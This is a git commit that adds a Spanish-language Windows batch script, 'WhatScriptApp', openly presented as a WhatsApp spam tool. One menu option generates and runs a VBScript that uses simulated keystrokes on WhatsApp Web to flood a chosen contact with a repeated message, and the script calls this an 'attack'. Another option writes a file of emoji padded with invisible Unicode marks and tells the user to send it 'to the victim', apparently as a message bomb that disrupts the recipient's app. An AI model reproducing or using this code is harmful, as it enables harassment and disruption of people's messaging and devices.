bb06cfa8ad5db2d47c81e320097bf723374abbe1
Pericena <pericena12@gmail.com>
2018-10-27 20:31:30 -0400

    Proyecto Final

---
+++ Codigo/WhatScriptApp.bat
@@ -0,0 +1,250 @@
+@rem Sigueme en las redes Sociales:
+@rem Blogger          https://lpericena.blogspot.com/
+@rem Github            https://github.com/Pericena
+@rem youtube.com  https://www.youtube.com/channel/UCELx1m-NeAdBn7mCuQ86kcw
+@rem pinterest        https://es.pinterest.com/lushiopericena/
+@rem twitter             https://twitter.com/LPericena
+@rem linkedin         https://www.linkedin.com/in/lpericena/
+@rem facebook       https://www.facebook.com/profile.php?id=100009309755063
+@rem pagina facebook  https://www.facebook.com/lpericena
+@rem sitio web        https://pericena.wordpress.com/
+@rem vimeo         https://vimeo.com/lpericena
+@rem instagram      https://www.instagram.com/lpericena/
+@rem remote      https://remote.com/luishinopericena-choque
+@rem google+   https://plus.google.com/u/0/114054031405340478901
+@rem kiwi       https://kiwi.qa/LuishinoC
+@rem App    https://apps.facebook.com/167466933725219
+@rem Grupo    https://www.facebook.com/groups/122223121705126/?source_id=1506435219407506
+@rem socialtools https://www.socialtools.me/index?action=demoApps&preview=1&app_id=406101
+@rem teachlr    https://teachlr.com/lpericena
+@rem wikipedia  https://es.wikipedia.org/wiki/Usuario:Luishi%C3%B1o_Pericena_Choque
+@rem ask          https://ask.fm/Lpericena
+@rem stackoverflow  https://stackoverflow.com/users/6506592/luishi%C3%B1o-pericena-choque
+@rem wix https://lpericena.wixsite.com/curriculumvitae
+
+
+title WhatScriptApp
+@echo off
+color 02
+mode con lines=40 cols=69
+
+del /f Binary.txt
+del /f Binary
+del /f script.vbs
+CLS
+:menu
+color 02
+echo.&set /a _pr=_pr+0
+TIMEOUT /T 0 /nobreak>NUL      
+echo.                .78@@B@B@BM2:    .i.       
+TIMEOUT /T 0 /nobreak>NUL 
+echo.              2@B@B@B@B@@@B@@@2    i7                
+TIMEOUT /T 0 /nobreak>NUL 
+echo.            7B@@@B@BBMMMMMMMBB@BS   .2.      
+TIMEOUT /T 0 /nobreak>NUL 
+echo.           BB@B@X:.MBBMMMMMMMMM@B@   .0.       
+TIMEOUT /T 0 /nobreak>NUL 
+echo.          @BBM@2    @BMMM8M8MMMMBB@   .M            
+TIMEOUT /T 0 /nobreak>NUL 
+echo.         XB@MBB      @MM8MMM8M8MMBB@   SS                 
+TIMEOUT /T 0 /nobreak>NUL 
+echo.         B@MMM@:    7@M8M8M8M8M8M8@B:  .@.        
+TIMEOUT /T 0 /nobreak>NUL 
+echo.        r@BMMMB@   .B@BMMMMMMMMM8MM@S   B7                 
+TIMEOUT /T 0 /nobreak>NUL   
+echo.        2BB8MMB@@   :B@B@B@B@B@MMMMB8   @2           
+TIMEOUT /T 0 /nobreak>NUL 
+echo.        r@BMMMMBB@i   7@B@B:.XB@BMM@S   @2     
+TIMEOUT /T 0 /nobreak>NUL 
+echo.         @@MM8MMBB@Z    .7      @B@B:   @r           
+TIMEOUT /T 0 /nobreak>NUL 
+echo.     .   XBBMM8M8MB@B0.         @@BB   0@.      
+TIMEOUT /T 0 /nobreak>NUL 
+echo.      .   @@M8M8M8MM@B@BS:   .2B@B@   .B2      
+TIMEOUT /T 0 /nobreak>NUL 
+echo.      ..   @BMMMMMMMMBM@B@B@B@B@B@    B@                 
+TIMEOUT /T 0 /nobreak>NUL 
+echo.          :B@B@B@MMMMMMMMB@B@@@B2   .B@      
+TIMEOUT /T 0 /nobreak>NUL 
+echo.          B@B@0BB@B@B@B@B@B@B@2    2@M           
+TIMEOUT /T 0 /nobreak>NUL 
+echo.         rX.    .7ZB@B@B@B87.    7@B7                   
+TIMEOUT /T 0 /nobreak>NUL 
+echo.             .r               :8B@2         
+TIMEOUT /T 0 /nobreak>NUL 
+echo.        i2MB@BBS227:.. ..:7X@B@Wi                      
+TIMEOUT /T 0 /nobreak>NUL 
+echo.     :M@@M2:     .i2S00M88X2i.          
+TIMEOUT /T 0 /nobreak>NUL 
+echo.                                     
+TIMEOUT /T 0 /nobreak>NUL
+echo.              Autor: Luishiño Pericena Choque 
+TIMEOUT /T 0 /nobreak>NUL 
+echo.                 ¸https://lpericena.blogspot.com/	
+TIMEOUT /T 0 /nobreak>NUL 
+echo.                   phone:+59160969818´  
+TIMEOUT /T 0 /nobreak>NUL 
+echo.Opciones:
+echo.     [w] iniciar WhatsApp Web.    [e] Abrir excel SpamWhatSApp 
+echo.     [s] Spam WhatsApp.           [c] Abrir word CodigoBinario.doc
+echo.     [x] Salir.                   [b] Generar codigo Binario.
+echo.     
+set /p Web=Introdusca una opcion[*]
+if %web%==w goto :w
+if %web%==s goto :s
+if %web%==m goto :m
+if %web%==b goto :b
+if %web%==e goto :e
+if %web%==c goto :c
+if %web%==x goto :x
+:x
+exit
+
+:m
+cls
+goto menu
+
+:c
+start Tools/Word/CodigoBinario.doc
+cls
+goto menu
+:e
+start Tools/Excel/SpamWhatSApp.xlsm
+cls
+goto menu
+
+:w
+cls
+TIMEOUT /T 0 /nobreak>NUL 
+echo.
+echo.     __      __.__            __           _____                 
+TIMEOUT /T 0 /nobreak>NUL 
+echo.    /  \    /  \  ^|__ _____ _/  ^|_  ______ /  _  \ ______ ______  
+TIMEOUT /T 0 /nobreak>NUL 
+echo.    \   \/\/   /  ^|  \\__  \\   __\/  ___//  /_\  \\____ \\____ \ 
+TIMEOUT /T 0 /nobreak>NUL 
+echo.     \        /^|   Y  \/ __ \^|  ^|  \___ \/    ^|    \  ^|_^> ^>  ^|_^> ^>
+TIMEOUT /T 0 /nobreak>NUL 
+echo.      \__/\  / ^|___^|  (____  /__^| /____  ^>____^|__  /   __/^|   __/ 
+TIMEOUT /T 0 /nobreak>NUL 
+echo.           \/       \/     \/          \/        \/^|__^|   ^|__^|    
+TIMEOUT /T 0 /nobreak>NUL 
+echo.[*]Espere a que WhatsApp Web este abierto completamente.
+TIMEOUT /T 0 /nobreak>NUL 
+echo.[*]Con cual contacto quiere hacer SPAM?
+TIMEOUT /T 0 /nobreak>NUL 
+echo.[*]Cual es el mensaje que quiere enviar?
+TIMEOUT /T 0 /nobreak>NUL 
+echo.[*]Cuantas veces quiere mandar el mensaje?
+echo. https://web.whatsapp.com/
+start https://web.whatsapp.com/
+echo.
+set /p=Enter
+cls
+goto menu
+
+:s
+echo.^' InputBoxes>>script.txt
+
+echo.MsgBox "Espere a que WhatsApp Web este abierto completamente?", 1024 + vbSystemModal, "Preparando">>script.txt
+
+echo.Contact = InputBox("Con cual contacto quiere hacer SPAM?", "WhatsApp")>>script.txt
+echo.Message = InputBox("Cual es el mensaje que quiere enviar?","WhatsApp")>>script.txt
+echo.T = InputBox("Cuantas veces quiere mandar el mensaje?","WhatsApp")>>script.txt
+echo.If MsgBox("El mensaje se enviado correctamente", 1024 + vbSystemModal, "WhatsApp") = vbOk Then>>script.txt
+
+ 
+echo.' Abre o WhatsApp>>script.txt
+echo.Set WshShell = WScript.CreateObject("WScript.Shell")>>script.txt
+echo.Return = WshShell.Run("https://web.whatsapp.com/", 1)>>script.txt
+ 
+echo.' Loading Time >>script.txt
+echo.If MsgBox("Espere a que WhatsApp Web este abierto completamente?" ^& vbNewLine ^& vbNewLine ^& "Escoja SI para continuar o NO para cancelar el ataque", vbYesNo ^+ vbQuestion ^+ vbSystemModal, "WhatsApp") ^= vbYes Then>>script.txt
+ 
+echo.' Editado por Limontec.com para evitar bloqueio do WhatsApp>>script.txt
+echo.MsgBox "Espere a que WhatsApp Web este abierto completamente?", 1024 + vbSystemModal, "Preparando">>script.txt
+
+
+ 
+echo.' Abre o WhatsApp Search Bar>>script.txt
+echo.WScript.Sleep 50>>script.txt
+echo.WshShell.SendKeys "{TAB}">>script.txt
+ 
+ 
+
+echo.' Busca pelo contato>>script.txt
+echo.WScript.Sleep 50>>script.txt
+echo.WshShell.SendKeys Contact>>script.txt
+echo.WScript.Sleep 5000>>script.txt
+echo.WshShell.SendKeys "{ENTER}">>script.txt
+echo.WScript.Sleep 5000>>script.txt
+ 
+echo.' Loop das mensagens>>script.txt
+echo.For i = 0 to T>>script.txt
+echo.WScript.Sleep 5>>script.txt
+echo.WshShell.SendKeys Message>>script.txt
+echo.WScript.Sleep 5>>script.txt
+echo.WshShell.SendKeys "{ENTER}">>script.txt
+echo.Next>>script.txt
+ 
+echo.' Fim do Script>>script.txt
+echo.WScript.Sleep 3000>>script.txt
+echo.MsgBox "Spam-WhatsApp no " + Contact + "Se completo exitosamente", 1024 + vbSystemModal, "Spam-WhatsApp">>script.txt
+
+echo.'voz>>script.txt
+echo.Dim speaks,speech>>script.txt
+echo.speaks="El mensaje se enviado correctamente">>script.txt
+echo.set speech=CreateObject("sapi.spvoice")>>script.txt
+echo.speech.Speak speaks >>script.txt
+ 
+echo.' Mensagem de Script cancelado>>script.txt
+echo.Else>>script.txt
+echo.MsgBox "El processo fue cancelado Spam-WhatsApp", vbSystemModal, "Spam-WhatsApp Cancelado" >>script.txt
+echo.End If>>script.txt
+echo.Else>>script.txt
+echo.End If >>script.txt
+
+ren script.txt script.vbs
+TIMEOUT /T 2 /nobreak>NUL 
+
+echo.     __      __.__            __           _____                 
+TIMEOUT /T 0 /nobreak>NUL 
+echo.    /  \    /  \  ^|__ _____ _/  ^|_  ______ /  _  \ ______ ______  
+TIMEOUT /T 0 /nobreak>NUL 
+echo.    \   \/\/   /  ^|  \\__  \\   __\/  ___//  /_\  \\____ \\____ \ 
+TIMEOUT /T 0 /nobreak>NUL 
+echo.     \        /^|   Y  \/ __ \^|  ^|  \___ \/    ^|    \  ^|_^> ^>  ^|_^> ^>
+TIMEOUT /T 0 /nobreak>NUL 
+echo.      \__/\  / ^|___^|  (____  /__^| /____  ^>____^|__  /   __/^|   __/ 
+TIMEOUT /T 0 /nobreak>NUL 
+echo.           \/       \/     \/          \/        \/^|__^|   ^|__^|    
+TIMEOUT /T 0 /nobreak>NUL 
+
+
+::cd ./Tools
+FOR %%j in (*.vbs) DO echo.----------------------^>[%%j]
+call script.vbs
+set /p=Enter
+del /f script.vbs
+cls
+goto menu
+
+:b
+cls
+echo. 👉🏼^<⚫^>👈🏼  By Luishiño Pericena Choque>>Binary
+echo. 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 👉🏼^<⚫^>👈🏼 ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎¡No toques aquí! >>Binary.txt
+echo. 👉🏼^<⚫^>👈🏼 ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏  ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎ ‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎¡No toques aquí!
+echo.                                             
+echo.
+echo.[*]Abrir el archivo Binary.txt 
+echo.[*]Copiar el contenido.
+echo.[*]Enviar a la victima.
+set /p=Enter
+cls
+goto menu
+
+
+echo.&set /a _pr=_pr+1
+goto %1
+echo ERROR: _returnto param wrong or undefined!&PAUSE
+REM ## End of THE PROGRESS BAR SUBROUTINE ##
